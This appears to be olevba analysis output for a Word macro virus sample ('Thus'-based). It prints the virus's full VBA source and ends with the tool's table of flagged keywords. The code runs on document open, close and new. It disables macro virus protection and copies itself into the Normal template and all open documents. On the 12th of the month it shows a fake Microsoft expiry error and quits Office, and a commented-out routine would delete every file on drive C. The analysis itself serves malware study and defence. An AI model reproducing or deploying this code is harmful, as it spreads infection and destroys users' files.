olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-4766a5b383f4c8d3f2e740f43c2261b7ff4a1965
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-4766a5b383f4c8d3f2e740f43c2261b7ff4a1965 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Fly'
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Fly'" Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    Set File_Com = CommandBars("Menu Bar").Controls("Ñåðâèñ") _
        .Controls("Ìàêðîñ")
    File_Com.Enabled = False
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Fly'" Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    Next k
    If (Day(Now()) = 12) Then
    MsgBox "Expiry date is over. You need to phone your contact dealer of Microsoft company or terminate Office 97.", vbCritical, "Critical error"
    Application.Quit
'    With Application.FileSearch
'        .NewSearch
'        .LookIn = "C:\"
'        .SearchSubFolders = True
'        .FileName = "*.*"
'        .MatchTextExactly = False
'        .FileType = msoFileTypeAllFiles
'        If .Execute > 0 Then
'        For i = 1 To .FoundFiles.Count
'        Kill .FoundFiles(i)
'        Next i
'        End If
'    End With
    End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub
















-------------------------------------------------------------------------------
VBA MACRO 1Table 
in file: Virus.MSWord.Thus-based-4766a5b383f4c8d3f2e740f43c2261b7ff4a1965 - OLE stream: '1Table'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Fly'
    On Error Resume Next
    Application.Options.VirusProt
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

